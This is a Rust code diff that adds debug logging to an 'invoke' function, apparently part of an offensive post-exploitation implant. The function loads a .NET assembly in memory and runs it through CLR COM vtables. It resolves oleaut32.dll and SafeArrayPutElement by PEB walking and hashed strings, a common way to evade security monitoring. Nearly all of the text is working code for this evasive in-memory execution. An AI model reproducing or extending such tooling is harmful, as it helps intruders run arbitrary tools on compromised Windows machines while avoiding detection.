@@ -244,27 +244,42 @@ pub(crate) unsafe fn invoke(
     _entry_point: u32,
 ) -> Result<(), BofError> {
     unsafe {
+        crate::dlog2(b"[invoke] entered");
+        crate::dlog2_hex(b"[invoke]   args_str.len=", args_str.len() as u32);
         let a = asm.as_raw();
         let mut mi_ptr: *mut c_void = core::ptr::null_mut();
+        crate::dlog2(b"[invoke] Assembly::entry_point()");
         let hr = ((*(*a).vtbl).entry_point)(a as *mut c_void, &mut mi_ptr);
+        crate::dlog2_hex(b"[invoke]   entry_point hr=", hr as u32);
         if hr < 0 || mi_ptr.is_null() {
+            crate::dlog2(b"[invoke]   entry_point FAILED");
             return Err(BofError::Clr { hr, op: "c8" });
         }
         let mi = mi_ptr as *mut MethodInfo;
 
         let tokens: Vec<&str> = args_str.split_whitespace().collect();
+        crate::dlog2_hex(b"[invoke]   tokens.len=", tokens.len() as u32);
+
+        crate::dlog2(b"[invoke] SA-create variant(1)");
         let args_sa = OwnedSafeArray::create(VT_VARIANT, 1)
             .ok_or(BofError::Clr { hr: -1, op: "c9" })?;
+        crate::dlog2(b"[invoke]   args_sa ok");
+
+        crate::dlog2(b"[invoke] SA-create bstr(n)");
         let bstr_array = OwnedSafeArray::create(VT_BSTR, tokens.len() as u32)
             .ok_or(BofError::Clr { hr: -1, op: "cA" })?;
+        crate::dlog2(b"[invoke]   bstr_array ok");
 
+        crate::dlog2(b"[invoke] resolve ole module + put export");
         if let Some(oleaut) =
             opsec_peb::resolve_module(opsec_strcrypt::hash!("oleaut32.dll"))
         {
+            crate::dlog2(b"[invoke]   ole module found");
             if let Some(put) = opsec_peb::resolve_export(
                 oleaut,
                 opsec_strcrypt::hash!("SafeArrayPutElement"),
             ) {
+                crate::dlog2(b"[invoke]   put export found");
                 type PutFn = unsafe extern "system" fn(
                     *mut SafeArray,
                     *const i32,
@@ -289,12 +304,19 @@ pub(crate) unsafe fn invoke(
                     &mut wrapper as *mut Variant as *mut c_void,
                 );
                 core::mem::forget(bstr_array);
+                crate::dlog2(b"[invoke]   args packed into SafeArray");
+            } else {
+                crate::dlog2(b"[invoke]   put export NOT FOUND");
             }
+        } else {
+            crate::dlog2(b"[invoke]   ole module NOT FOUND");
         }
 
         let mut retval: Variant = core::mem::zeroed();
         let obj: Variant = core::mem::zeroed();
+        crate::dlog2(b"[invoke] MethodInfo::invoke_3()");
         let hr = ((*(*mi).vtbl).invoke_3)(mi as *mut c_void, obj, args_sa.ptr, &mut retval);
+        crate::dlog2_hex(b"[invoke]   invoke_3 hr=", hr as u32);
         if hr < 0 {
             return Err(BofError::Clr { hr, op: "cB" });
         }
